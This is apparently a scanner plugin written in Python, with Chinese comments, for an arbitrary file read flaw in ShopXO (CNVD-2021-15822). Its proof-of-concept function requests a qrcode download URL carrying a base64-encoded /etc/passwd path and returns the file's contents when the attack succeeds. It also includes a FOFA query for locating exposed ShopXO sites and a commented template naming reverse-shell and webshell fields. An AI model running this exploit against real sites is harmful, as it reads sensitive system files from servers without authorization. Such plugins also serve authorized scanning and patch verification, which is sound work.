# -*- coding: UTF-8 -*-
#!/usr/bin/python
import urllib.parse
import requests,base64
requests.packages.urllib3.disable_warnings()
def vuln_info():
    info={
        'vuln_name': '任意文件读取',  #漏洞名称
        'vuln_referer':'https://idc.wanyunshuju.com/aqld/2286.html',  #漏洞来源
        'vuln_author':'未知',  #插件作者
        'cms_name':'ShopXO',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''ShopXO是一套开源的企业级开源电子商务系统。ShopXO存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息 app="ShopXO企业级B2C电商系统提供商"''',
        'vuln_identifier':'''CNVD-2021-15822''',
        'vuln_class':'任意文件读取',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''无''',
        'FofaQuery_type':'socket', #socket、http
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="ShopXO企业级B2C电商系统提供商"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':0  #是否有exp   1为有 0为无
    }
    return info
# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
    # 返回参数
    #Result返回是否存在，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":""}
        vuln_url =url+"/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q="     
        # print(vuln_url)
        r = requests.get(vuln_url,headers=heads, verify=False,timeout=5)
        # print(r.text)
        if r.status_code==200 and 'root:x:0:0:' in r.text:
            result['Result']= True
            result['Result_Info']= 'Payload:'+vuln_url+'\nResult:'+str(r.text)
        else:
            vuln_url =url+"/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q="   
            r = requests.get(vuln_url,headers=heads, verify=False,timeout=5)
            if r.status_code==200 and 'root:x:0:0:' in r.text:
                result['Result']= True
                result['Result_Info']= 'Payload:'+vuln_url+'\nResult:'+str(r.text)
            else:
                result['Result_Info']= '不存在'
        return result    
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

    # {
    #     "type":"cmd",  #cmd,shell,uploadfile
    #     "command":"whoami",  #cmd命令
    #     "reverse_ip":"127.0.0.1", #反弹shell的ip
    #     "reverse_port":"8888", #反弹shell的端口
    #     "filename":"conf.php", #写入文件的名字
    #     "filename_contents":"shell内容", #shell文件内容
    # }
# url:url   hostname：主机地址  port：端口  scheme：服务  heads:自定义请求头 
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
    # 返回参数
    #Result返回是否成功，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":"不存在"}
        return result   # 
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

